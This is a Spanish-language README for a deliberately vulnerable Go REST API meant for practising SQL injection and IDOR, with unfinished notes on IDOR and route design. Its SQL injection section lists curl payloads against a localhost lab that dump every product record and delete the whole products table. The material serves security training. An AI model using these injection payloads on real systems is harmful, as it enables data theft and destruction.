# go-vulnerable-api

A deliberately vulnerable REST API built in Go that demonstrates common security vulnerabilities including SQL Injection (SQLi) and Insecure Direct Object Reference (IDOR).

## Run Application

    docker-compose down -v --rmi all
    docker-compose up --build -d

## SQL Injection

### Payloads

> El parámetro --data-urlencode hace automáticamente la codificación URL por ti, así que no tienes que preocuparte por escribir %27, %20, etc.

> Codificación y espacios, por eso algunos payloads no funcionan.

#### Deberia permitir listar solo 1 registro y permite listarlos todos. (GET)

    curl -X GET "http://localhost:8081/products/search?id=2"

    curl -k -X GET "http://localhost:8081/products/search?id=2%27%20OR%20%27%27=%27"

    curl -k -GET "http://localhost:8081/products/search" \
    --data-urlencode "id=2' OR ''='"

    curl "http://localhost:8081/products/search?id=2'OR''='"

    curl "http://localhost:8081/products/search?id=2'+OR+''='"

> Es vulnerable por que se utiliza query param.


#### Permite eliminar los registros de la tabla products. (DELETE)

    curl -X DELETE http://localhost:8081/products/?id=4

    curl -k -X DELETE "http://localhost:8081/products/?id=4%27%20OR%20%27%27=%27"

    curl -k -X DELETE -G "http://localhost:8081/products/" \
    --data-urlencode "id=4' OR ''='"

    curl -k -X DELETE "http://localhost:8081/products/?id=4'OR''='"

    curl -k -X DELETE "http://localhost:8081/products/?id=4'+OR+''='--+"


### Explotación con sqlmap




## IDOR

- Requiere crea endpoint de submit, 
contexto
propietario del libro (?)
/books/v1 ??
- con products no tiene sentido implementar el IDOR, quiza otra entidad
VAmPI


## Pendings

- Pendiente actualizar dependencias de pgx
- CLI Scaffolding
- con certificados|sin certificados



# Other vulnerables

https://www.youtube.com/watch?v=4Tx9NwvHOkM



# Ajuste

/products para recuperar todos

/products/search  para recuperar por id.  (parece php)

- MUY RESTFUL: Es la convención estándar para acceder a un elemento dentro de una colección.

/products/{id}
/products/123


- MENOS RESTFUL: pero aceptado. A menudo se utiliza cuando los criterios de búsqueda son complejos o no canónicos.

/products/search?q=...